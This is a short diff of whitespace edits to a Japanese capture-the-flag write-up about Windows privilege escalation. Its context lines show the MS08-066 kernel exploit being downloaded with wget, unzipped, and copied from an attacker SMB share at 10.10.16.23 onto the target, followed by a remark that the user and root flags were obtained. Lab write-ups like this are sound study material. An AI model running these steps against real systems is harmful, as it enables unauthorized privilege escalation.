@@ -199,7 +199,7 @@ Network Card(s):           N/A
 ```sh
 └─$ wget -nv https://github.com/SecWiki/windows-kernel-exploits/raw/refs/heads/master/MS08-066/ms08066%E6%8F%90%E6%9D%83(XP%202003).zip
 2025-08-09 05:12:35 URL:https://raw.githubusercontent.com/SecWiki/windows-kernel-exploits/refs/heads/master/MS08-066/ms08066%E6%8F%90%E6%9D%83(XP%202003).zip [57071/57071] -> "ms08066提权(XP 2003).zip" [1]
-                                                                                                                                                                                                                                            
+
 └─$ unzip ms08066提权\(XP\ 2003\).zip
 Archive:  ms08066提权(XP 2003).zip
    creating: ms08066提权(XP 2003)/
@@ -270,7 +270,7 @@ Successfully processed 1 files; Failed processing 0 files
 c:\windows\system32\inetsrv>cd C:\ADFS
 cd C:\ADFS
 ```
-エクスプロイト実行、成功！
+エクスプロイト実行、成功！  
 ユーザフラグ、ルートフラグゲット！
 ```sh
 C:\ADFS>copy \\10.10.16.23\share\ms08066.exe .
